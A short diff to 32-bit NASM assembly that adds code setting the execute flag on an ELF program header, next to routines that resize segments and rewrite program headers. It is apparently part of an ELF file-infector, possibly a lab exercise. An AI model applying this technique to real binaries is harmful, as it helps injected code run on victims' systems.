@@ -47,6 +47,7 @@
 %define ENTRY		24
 %define PHDR_start	28
 %define	PHDR_size	32
+%define PHDR_flags 24
 %define PHDR_memsize	20
 %define PHDR_filesize	16
 %define	PHDR_offset	4
@@ -187,6 +188,9 @@ modify_file_size:
     sub     ecx, ebx
     mov     [eax + PHDR_filesize], ecx
     mov     [eax + PHDR_memsize], ecx
+
+modify_exec_permission:
+    or     dword [eax + PHDR_flags], 1
 
 overload_PHDRs:
     lseek   [ebp - 8], [ebp - 16], SEEK_SET
